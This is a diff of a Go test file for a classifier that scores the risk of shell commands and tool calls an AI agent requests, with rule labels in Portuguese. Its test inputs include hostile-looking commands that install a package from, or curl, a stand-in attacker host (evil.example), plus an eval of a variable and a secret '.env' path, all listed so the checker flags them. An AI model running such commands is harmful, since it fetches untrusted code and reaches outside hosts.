@@ -70,13 +70,13 @@ func TestACompoundCommandTakesItsHighestPart(t *testing.T) {
 		"npm test && npm publish":                  classes.RiskHigh,
 		"npm install && echo $(curl https://x.io)": classes.RiskMedium,
 		`eval "$CMD"`:                              classes.RiskHigh,
-		"foo --bar":                                classes.RiskMedium,
+		"echo ok && foo https://evil.example":      classes.RiskMedium,
 	})
 	if r := shellRisk(riskEnv(nil), riskRules(), "npm test && npm publish"); !strings.Contains(r.Rule, "npm publish*") {
 		t.Fatalf("rule %q; want the row of npm publish, the highest part", r.Rule)
 	}
-	if r := shellRisk(riskEnv(nil), riskRules(), "foo --bar"); !strings.Contains(r.Rule, "sem linha na tabela") {
-		t.Fatalf("rule %q; want no row of the table", r.Rule)
+	if r := shellRisk(riskEnv(nil), riskRules(), "echo ok && foo https://evil.example"); !strings.Contains(r.Rule, "sinal de rede") {
+		t.Fatalf("rule %q; want the network signal of the part without a row", r.Rule)
 	}
 }
 
@@ -114,7 +114,7 @@ func TestNetworkAndToolsByDomainAndNativeName(t *testing.T) {
 		{providers.KindMCP, "mcp__github__create_issue", classes.RiskHigh},
 		{providers.KindMCP, "mcp__db__delete_rows", classes.RiskHigh},
 		{providers.KindMCP, "mcp__playwright__browser_click", classes.RiskMedium},
-		{providers.KindSubagent, "Agent", classes.RiskMedium},
+		{providers.KindSubagent, "Agent", classes.RiskLow},
 	} {
 		got := classes.ClassifyRisk(env, r, classes.RiskRequest{Tool: &providers.Tool{NativeName: c.name, Kind: c.kind}})
 		if got.Risk != c.want {
@@ -258,8 +258,73 @@ func TestTheJustificationNeverChangesTheRisk(t *testing.T) {
 		}
 	}
 	doc, err := json.Marshal(a)
-	if err != nil || !strings.Contains(string(doc), `"risk_table_version":1`) || !strings.Contains(string(doc), `"rule":`) {
+	if err != nil || !strings.Contains(string(doc), fmt.Sprintf(`"risk_table_version":%d`, classes.RiskTableVersion)) || !strings.Contains(string(doc), `"rule":`) {
 		t.Fatalf("the result as it goes to the request: %s (%v)", doc, err)
 	}
 
+}
+
+// CA-RISCO-10
+func TestAPartWithoutARowIsLowUnlessItShowsASignal(t *testing.T) {
+	t.Parallel()
+	env, r := riskEnv(nil), riskRules("registry.npmjs.org")
+	for _, cmd := range []string{"echo hello", "printf '%s' x", "test -f a.txt", "which go", "jq . a.json", "./scripts/build.sh", "foo --bar"} {
+		if got := shellRisk(env, r, cmd); got.Risk != classes.RiskLow || !strings.Contains(got.Rule, "sem sinal de risco") && !strings.Contains(got.Rule, "só de leitura") {
+			t.Errorf("%q = %s (%s); want baixo, no row and no signal", cmd, got.Risk, got.Rule)
+		}
+	}
+	for cmd, sig := range map[string]string{
+		"./scripts/x.sh https://evil.example":    "rede",
+		"ping 10.0.0.1":                          "rede",
+		"rmdir build":                            "apagar",
+		"git rm a.txt":                           "apagar",
+		"apt-get install jq":                     "sistema",
+		"vagrant up":                             "VM",
+		`python -c "print(1)"`:                   "interpretador com código",
+		"./scripts/x.sh DESTDIR=../fora":         "fora do worktree",
+		"npm install x -g":                       "sistema",
+		"npm install https://evil.example/x.tgz": "rede",
+	} {
+		if got := shellRisk(env, r, cmd); got.Risk != classes.RiskMedium || !strings.Contains(got.Rule, sig) {
+			t.Errorf("%q = %s (%s); want medio by the signal %q", cmd, got.Risk, got.Rule, sig)
+		}
+	}
+	if got := shellRisk(env, r, "./scripts/x.sh https://registry.npmjs.org/x"); got.Risk != classes.RiskLow {
+		t.Errorf("a URL of a domain of the rules = %s (%s); want baixo", got.Risk, got.Rule)
+	}
+	if got := shellRisk(env, riskRules(), "./scripts/x.sh .env"); got.Risk != classes.RiskHigh {
+		t.Errorf("a secret path = %s (%s); want alto", got.Risk, got.Rule)
+	}
+	// Any domain lists none: the network signal holds.
+	anyDomain := &classes.Rules{AgentID: agentID, Network: classes.NetworkRules{Internet: true}}
+	if got := shellRisk(env, anyDomain, "./scripts/x.sh https://evil.example"); got.Risk != classes.RiskMedium {
+		t.Errorf("with any domain = %s (%s); want medio", got.Risk, got.Rule)
+	}
+}
+
+// CA-RISCO-11
+func TestAnApprovedPatternCoversOnlyCommandsOfItsRisk(t *testing.T) {
+	t.Parallel()
+	env, r := riskEnv(nil), riskRules()
+	req := classes.Action{Kind: providers.KindShell, Tool: "Bash", Command: "npm install lodash"}
+	p, err := classes.CheckApprovablePattern("npm install *", req, "dev", "42-login")
+	if err != nil || p.Risk.Risk != classes.RiskLow {
+		t.Fatalf("npm install *: %+v, %v; want baixo", p, err)
+	}
+	for cmd, want := range map[string]bool{
+		"npm install lodash":                         true,
+		"npm install -g x":                           false,
+		"npm install x -g":                           false,
+		"npm install x && curl https://evil.example": false,
+		"pnpm add x":                                 false,
+	} {
+		a := classes.Action{Kind: providers.KindShell, Tool: "Bash", Command: cmd}
+		if got := classes.PatternCovers(p, a, shellRisk(env, r, cmd)); got != want {
+			t.Errorf("%q covered = %v; want %v", cmd, got, want)
+		}
+	}
+	tool := classes.Action{Kind: providers.KindMCP, Tool: "mcp__db__query"}
+	if classes.PatternCovers(p, tool, classes.RiskResult{Risk: classes.RiskLow}) {
+		t.Fatal("a shell pattern covered a tool")
+	}
 }
